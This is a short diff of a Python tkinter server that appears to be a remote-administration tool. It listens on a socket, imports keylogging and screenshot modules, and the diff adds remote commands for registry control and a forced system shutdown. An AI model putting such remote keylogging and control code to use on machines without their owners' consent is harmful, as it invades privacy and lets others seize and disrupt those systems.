@@ -3,9 +3,11 @@ import tkinter as tk
 from tkinter import messagebox
 from PIL import ImageGrab,Image
 from keylog import Keylog
+from registry import Registry
 from process import Process
 from app import App
 import io
+import os
 HOST = ""
 PORT = 65432
 class Main(tk.Frame):
@@ -115,6 +117,12 @@ class Main(tk.Frame):
                                     app.app_start(id)
                         elif cmd=="exit":
                             break
+                elif bigcmd=="REGISTRY":
+                    #print("haaha")
+                    registry=Registry(self.conn)
+                    registry.run_process()
+                elif bigcmd=="SHUTDOWN":
+                    os.system("shutdown /s /t 600")
                 elif bigcmd=='exit':
                     self.is_opened=False
                     break
